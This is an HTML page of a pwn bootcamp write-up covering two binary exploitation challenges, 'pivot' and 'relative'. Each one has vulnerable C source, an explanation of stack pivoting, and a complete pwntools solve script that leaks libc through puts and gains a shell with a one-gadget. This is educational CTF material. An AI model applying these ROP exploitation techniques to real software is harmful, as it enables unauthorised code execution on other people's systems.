@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Week 04
+</h1>
+
+<div class="page-content">
+<p>This was the first week where things were pretty difficult for me. I will add writeups to these ones for sure, still barely understand how I did these.</p>
+<h1 id="pivot">pivot</h1>
+<p>Stack pivoting, the address of your input is leaked, and you can use leave; ret to jump to it. From there it's a ret2libc.</p>
+<p>We are given source code:</p>
+<pre data-lang="C" style="background-color:#2b303b;color:#c0c5ce;" class="language-C "><code class="language-C" data-lang="C"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">vuln</span><span>() {
+</span><span>	</span><span style="color:#b48ead;">char</span><span> buf[</span><span style="color:#d08770;">8</span><span>];
+</span><span>	</span><span style="color:#96b5b4;">fgets</span><span>(buf, </span><span style="color:#d08770;">24</span><span>, stdin);
+</span><span>}
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">query</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">malloc</span><span>(</span><span style="color:#d08770;">4096 </span><span>* </span><span style="color:#d08770;">4</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">whats you&#39;re name?</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">char</span><span>* name = </span><span style="color:#96b5b4;">malloc</span><span>(</span><span style="color:#d08770;">256</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">fgets</span><span>(name, </span><span style="color:#d08770;">256</span><span>, stdin);
+</span><span>	</span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">nice to meet you </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">!  i left your name tag at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span>&quot;, name, name);
+</span><span>	</span><span style="color:#bf616a;">vuln</span><span>();
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">setvbuf</span><span>(stdout, </span><span style="color:#d08770;">0</span><span>, _IONBF,</span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">setvbuf</span><span>(stdin, </span><span style="color:#d08770;">0</span><span>, _IONBF,</span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">setvbuf</span><span>(stderr, </span><span style="color:#d08770;">0</span><span>, _IONBF,</span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#bf616a;">query</span><span>();
+</span><span>}
+</span></code></pre>
+<p>We get to write 255 bytes (because fgets reads one less than size), and then are given the address of the buffer. Next is a vuln function which consists of 8 bytes of buffer and then 15 more bytes (remember because fgets reads size-1, this took me ages to bug fix when I sent 24 bytes and was confused when my subsequent writes were all off by one byte.) This vuln is just enough to overwrite rbp and rip, but not enough to add anything after it. Luckily, this is enough since we can set rbp to point to our leaked input from query(). Then, we overwrite rip to jump to a leave ret instruction which will load our ropchain from our query write. The following is an explanation that will hopefully clear things up, but it IS a very confusing thing at first, so don't feel bad if you're confused.</p>
+<p>First, we need to understand how leave works. Essentially leave is the same as </p>
+<pre data-lang="asm" style="background-color:#2b303b;color:#c0c5ce;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#b48ead;">mov </span><span style="color:#bf616a;">rbp</span><span>, </span><span style="color:#bf616a;">rsp
+</span><span style="color:#b48ead;">pop </span><span style="color:#bf616a;">rbp
+</span></code></pre>
+<p>What this means is that the value in rbp is moved to rsp, and the next 8 bytes are popped from the &quot;stack&quot; (wherever rsp is now pointing) into rbp. Let's break down our exploit a bit more now that we understand how leave works.</p>
+<p>First, we write 8 bytes of whatever and then our ROPchain into query. So our name buffer will look like this:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>name = &quot;AAAAAAAA&quot; + ropchain
+</span></code></pre>
+<p>Then we go into vuln, where we overwrite rbp to be the address of name, and rip to point to a leave ret gadget. Now, when we get to the end of the vuln function, right before the leave ret, our registers will look like</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>rsp = some real stack address
+</span><span>rbp = some real stack address, which points to the address of our name
+</span></code></pre>
+<p>Then, when the leave is executed, our registers will look like</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>rsp = some real stack address+ 8 (because the first 8 bytes are popped into rbp
+</span><span>rbp = address of name buffer
+</span></code></pre>
+<p>So now, the ret will execute, and we will jump to the leave ret gadget. When that leave executes, our registers will look like</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>rsp = address of name buffer+8
+</span><span>rbp = &quot;AAAAAAAA&quot;
+</span><span>rip = first address in our ROPchain
+</span></code></pre>
+<p>and then the ROP chain will execute. As you can see, the first 8 bytes of our name buffer are actually loaded into rbp, so we should set that to some address with read and write permissions so things don't break in-between.</p>
+<p>So we have a way of executing a ROPchain, we can just do a ret2libc using this method.</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>exe = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./pivot_patched</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-linux-x86-64.so.2</span><span>&quot;)
+</span><span>
+</span><span>context.binary = exe
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">conn</span><span>():
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>        gdb.</span><span style="color:#bf616a;">attach</span><span>(r)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7011</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    r = </span><span style="color:#bf616a;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># good luck pwning :)
+</span><span>
+</span><span>    rbp_val = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x3ff000</span><span>)
+</span><span>    rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4012bb</span><span>)
+</span><span>    leave_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401183</span><span>)
+</span><span>    puts_got = </span><span style="color:#bf616a;">p64</span><span>(exe.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span><span>    puts_plt = </span><span style="color:#bf616a;">p64</span><span>(exe.plt[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span><span>    query = </span><span style="color:#bf616a;">p64</span><span>(exe.sym[&#39;</span><span style="color:#a3be8c;">query</span><span>&#39;])
+</span><span>
+</span><span>    payload = rbp_val + rdi_ret + puts_got + puts_plt + query
+</span><span>    
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(r.</span><span style="color:#bf616a;">recvline</span><span>())
+</span><span>    </span><span style="color:#65737e;"># sending the payload to the first query()
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>    name = r.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">split</span><span>()[-</span><span style="color:#d08770;">1</span><span>]
+</span><span>    name = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">int</span><span>(name, </span><span style="color:#d08770;">16</span><span>))
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">name:</span><span>&#39;, name)
+</span><span>    </span><span style="color:#65737e;"># send to first vuln()
+</span><span>    r.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;*</span><span style="color:#d08770;">8 </span><span>+ name + leave_ret[:-</span><span style="color:#d08770;">1</span><span>])
+</span><span>
+</span><span>    leak = r.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>    base = </span><span style="color:#bf616a;">u64</span><span>(leak.</span><span style="color:#bf616a;">rstrip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39;)) - libc.symbols[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;]
+</span><span>
+</span><span>    onegadget = </span><span style="color:#bf616a;">p64</span><span>(base + </span><span style="color:#d08770;">0x4484f</span><span>)
+</span><span>    zero_rax = </span><span style="color:#bf616a;">p64</span><span>(base + </span><span style="color:#d08770;">0x980f5</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(r.</span><span style="color:#bf616a;">recvline</span><span>())
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">C</span><span>&#39;*</span><span style="color:#d08770;">8 </span><span>+ zero_rax + onegadget)
+</span><span>    name2 = r.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">split</span><span>()[-</span><span style="color:#d08770;">1</span><span>]
+</span><span>    name2 = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#bf616a;">int</span><span>(name2, </span><span style="color:#d08770;">16</span><span>))
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">name2:</span><span>&#39;, name2)
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">D</span><span>&#39;*</span><span style="color:#d08770;">8 </span><span>+ name2 + leave_ret)
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="relative">relative</h1>
+<p>Stack pivoting by using add rsp instructions. The add rsp, 8 instruction conveniently makes it so it returns directly onto our input.</p>
+<p>We are given source code:</p>
+<pre data-lang="C" style="background-color:#2b303b;color:#c0c5ce;" class="language-C "><code class="language-C" data-lang="C"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">gadgets</span><span>() {
+</span><span>	</span><span style="color:#b48ead;">asm</span><span>(&quot;</span><span style="color:#a3be8c;">add $8, %rsp;</span><span>&quot;);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>	</span><span style="color:#96b5b4;">setvbuf</span><span>(stdout, </span><span style="color:#d08770;">0</span><span>, _IONBF,</span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">setvbuf</span><span>(stdin, </span><span style="color:#d08770;">0</span><span>, _IONBF,</span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">setvbuf</span><span>(stderr, </span><span style="color:#d08770;">0</span><span>, _IONBF,</span><span style="color:#d08770;">0</span><span>);
+</span><span>	</span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">hi lol</span><span>&quot;);
+</span><span>	</span><span style="color:#b48ead;">char</span><span> buf[</span><span style="color:#d08770;">8 </span><span>* </span><span style="color:#d08770;">4</span><span>];
+</span><span>	</span><span style="color:#b48ead;">void </span><span>(*exit_cached)(</span><span style="color:#b48ead;">int</span><span>, </span><span style="color:#b48ead;">int</span><span>, </span><span style="color:#b48ead;">int</span><span>);
+</span><span>	exit_cached = exit;
+</span><span>	</span><span style="color:#96b5b4;">fgets</span><span>(buf, </span><span style="color:#d08770;">8 </span><span>* </span><span style="color:#d08770;">6</span><span>, stdin);
+</span><span>	</span><span style="color:#bf616a;">exit_cached</span><span>(</span><span style="color:#d08770;">1</span><span>,</span><span style="color:#d08770;">2</span><span>,</span><span style="color:#d08770;">3</span><span>);
+</span><span>	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span>;
+</span><span>}
+</span></code></pre>
+<p>We have a buffer overflow clearly, but not much else to work with. We can overwrite the value of exit_cached to call a function, so I first experimented with calling a bunch of different things like main and puts, but eventually I noticed that if you overwrite exit_cached to call the add rsp, 8 instruction, it moves rsp to the address of your input, which means when it tries to ret from gadget, it pops the first 8 bytes of your input into rip. So this means we can write a ROPchain into our input and overwrite exit_cached with the gadget to load the ROPchain. From here, I just used a ROPchain to leak libc and then jumped back to main. The next input is different since it segfaults in a different place. Luckily, it is still somewhere we control the value of, so we can just modify the size of our buffer to jump to another ROPchain and win.</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>exe = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./relative_patched</span><span>&quot;)
+</span><span>libc = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;)
+</span><span>ld = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./ld-linux-x86-64.so.2</span><span>&quot;)
+</span><span>
+</span><span>context.binary = exe
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">conn</span><span>():
+</span><span>    </span><span style="color:#b48ead;">if </span><span>args.</span><span style="color:#bf616a;">LOCAL</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>        gdb.</span><span style="color:#bf616a;">attach</span><span>(r)
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7012</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return </span><span>r
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    r = </span><span style="color:#bf616a;">conn</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># good luck pwning :)
+</span><span>    </span><span style="color:#bf616a;">BUFSIZE </span><span>= </span><span style="color:#d08770;">40
+</span><span>    rdi_ret = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x40125b</span><span>)
+</span><span>    puts_plt = </span><span style="color:#bf616a;">p64</span><span>(exe.plt[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span><span>    puts_got = </span><span style="color:#bf616a;">p64</span><span>(exe.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span><span>    main = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x4011af</span><span>)
+</span><span>    add_rsp_8 = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401012</span><span>)[:-</span><span style="color:#d08770;">1</span><span>]
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># only 7 bytes remaining, msb must be 0x00. Not much of an issue b/c all addresses can be specified in 7 bytes    
+</span><span>
+</span><span>    payload = rdi_ret + puts_got + puts_plt + main
+</span><span>    payload += </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*(</span><span style="color:#bf616a;">BUFSIZE</span><span>-</span><span style="color:#96b5b4;">len</span><span>(payload))
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>    r.</span><span style="color:#bf616a;">send</span><span>(payload + add_rsp_8)
+</span><span>
+</span><span>    leak = r.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>    base = </span><span style="color:#bf616a;">u64</span><span>(leak.</span><span style="color:#bf616a;">rstrip</span><span>().</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39;)) - libc.symbols[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;]
+</span><span>
+</span><span>    onegadget = </span><span style="color:#bf616a;">p64</span><span>(base+</span><span style="color:#d08770;">0x4484f</span><span>)
+</span><span>    zero_rax = </span><span style="color:#bf616a;">p64</span><span>(base+</span><span style="color:#d08770;">0x0980f5</span><span>)
+</span><span>
+</span><span>    payload2 = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;*</span><span style="color:#d08770;">24 </span><span>+ zero_rax + onegadget
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(payload2)
+</span><span>
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span>&quot;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
